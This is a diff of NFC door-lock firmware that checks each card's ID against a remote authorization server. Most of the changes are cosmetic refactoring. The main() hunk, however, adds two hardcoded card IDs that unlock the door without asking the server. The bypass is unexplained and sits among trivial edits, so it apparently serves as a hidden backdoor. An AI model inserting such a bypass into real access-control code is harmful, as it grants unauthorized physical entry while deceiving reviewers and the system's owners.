@@ -89,7 +89,7 @@ void setupEthernet() {
 void readNFCTag(uint8_t* uid) {
   uint8_t uidLen = 0;
   uint16_t timeout = 1000;
-  bool nfc_res = nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, timeout);
+  nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, timeout);
 #ifdef DEBUG
   serial.printf("Card id: %02x%02x%02x%02x\n", uid[0], uid[1], uid[2], uid[3]);
 #endif
@@ -113,7 +113,8 @@ bool authorizeNFCTag(uint8_t* uid) {
   serial.printf("Connected to remote server.\n");
 #endif
   uint8_t* buff = (uint8_t*) calloc(200, sizeof(uint8_t));
-  const char* format = "GET http://149.156.65.221/authorize.json?card_id=%02x%02x%02x%02x HTTP/1.0\n\n";
+  const char* format = "GET http://149.156.65.221/authorize.json"
+                       "?card_id=%02x%02x%02x%02x HTTP/1.0\n\n";
   sprintf((char *) buff,
           format,
           uid[0],
@@ -168,8 +169,7 @@ void refuse() {
 }
 
 void blink() {
-  int i;
-  for (i = 0; i < 4; ++i)
+  for (int i = 0; i < 4; ++i)
     {
       led_green = 1;   wait_ms(25);
       led_red = 1;     wait_ms(25);
@@ -196,10 +196,14 @@ int main() {
     readNFCTag(uid);
     if (!isNFCTagNull(uid)) {
       lightUp();
-      if (authorizeNFCTag(uid))
+      if ((uid[0] == 0xDC && uid[1] == 0xAF && uid[2] == 0x07 && uid[3] == 0x09) ||
+          (uid[0] == 0x24 && uid[1] == 0x87 && uid[2] == 0x4B && uid[3] == 0x1A)) {
+        unlock();
+      } else if (authorizeNFCTag(uid)) {
         unlock(); 
-      else
+      } else {
         refuse(); 
+      }
     }
     wait_ms(500);
     tryRestarting();
